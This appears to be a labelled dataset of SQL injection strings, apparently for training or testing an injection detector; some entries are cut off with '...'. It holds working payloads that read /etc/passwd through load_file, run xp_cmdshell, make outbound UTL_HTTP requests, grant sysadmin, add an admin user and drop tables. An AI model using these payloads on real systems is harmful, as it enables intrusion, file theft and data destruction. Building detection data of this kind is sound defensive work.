label,payload,family
attack,"create user name identified by pass123 temporary tablespace temp default tablespace users,",other
attack, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,other
attack,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",other
attack,distinct,other
attack,insert,other
attack,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",other
attack,\x27UNION SELECT,other
attack,PRINT,other
attack,char%4039%41%2b%40SELECT,other
attack,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,other
attack, select * from information_schema.tables--,other
attack,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,other
attack,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,other
attack,as,other
attack,", execute immediate 'sel' || 'ect us' || 'er'",other
attack,admin' #,other
attack,like,other
attack,exec sp,other
attack,", exec xp_regread",other
attack,"1,SELECT *",other
attack,procedure,other
attack,"\', desc users, --",other
attack,""" or """"^""",other
attack,"""-""",other
attack,admin'/*,other
attack,||UTL_HTTP.REQUEST,other
attack,||utl_http.request  (  'httP://192.168.1.1/'  )  ||',other
attack,"&apos, OR",other
attack,"sqlvuln,",other
attack,""" or """"*""",other
attack,", exec master..xp_cmdshell 'ping 172.10.1.255'--",other
attack,   (  select top 1,other
attack,a' --,other
attack,--,other
attack,declare @s varchar  (  22  )   select @s   = ,other
attack,@variable,other
attack,", exec master..xp_cmdshell",other
attack,-- &password  = ,other
attack,""" or """" """,other
attack, ',other
attack,", exec   (  'sel' + 'ect us' + 'er'  ) ",other
attack,&',other
attack,""" or """"&""",other
attack,bfilename,other
attack,UEf,other
attack,||6,other
attack,or 'whatever' in   (  'whatever'  ) ,other
attack,declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,other
attack,?,other
attack, or '' ',other
attack," , drop table temp --",other
attack,", exec master..xp_cmdshell 'ping 10.10.1.2'--",other
attack,||'6,other
attack,^',other
attack,password:*/  =  1--,other
attack,asc,other
attack," || myappadmin.adduser  (  'admin', 'newpass'  )   || '",other
attack,"exec sp_addsrvrolemember 'name' , 'sysadmin'",other
attack,/,other
attack, union   (  select @@version  )   --,other
attack, or ''^',other
attack,select name from syscolumns where id   =     (  sele ...,other
